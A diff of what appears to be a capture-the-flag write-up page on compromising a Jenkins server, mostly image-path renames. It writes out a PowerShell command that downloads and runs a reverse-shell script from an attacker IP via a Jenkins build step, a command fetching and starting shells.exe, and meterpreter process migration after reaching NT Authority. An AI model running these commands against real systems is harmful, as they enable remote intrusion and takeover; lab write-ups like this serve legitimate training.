@@ -28,7 +28,7 @@ admin:admin
 
 **Jenkins**
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (3).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
 
@@ -36,7 +36,7 @@ Under Build add a build step and select 'Execute Windows batch command' then  ad
 
 `powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.135.134:81/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp`
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
 &#x20;
 
@@ -68,13 +68,13 @@ Under Build add a build step and select 'Execute Windows batch command' then  ad
 
 `run`
 
-Victim&#x20;
+**Victim**&#x20;
 
-`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.8.234:8000/shells.exe','shells.exe')"`
+`powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.8.234:81/shells.exe','shells.exe')"`
 
 `Start-Process "shell.exe"`
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### **Privilege Escalation**
 
@@ -92,7 +92,7 @@ Victim&#x20;
 
 We are now NT Authority&#x20;
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 Migrating processes to make sure we have correct permissions for the privileged user. The safest process to pick is the services.exe process
 
@@ -100,6 +100,6 @@ Migrating processes to make sure we have correct permissions for the privileged 
 
 `migrate 668`
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (3).png" alt=""><figcaption></figcaption></figure>
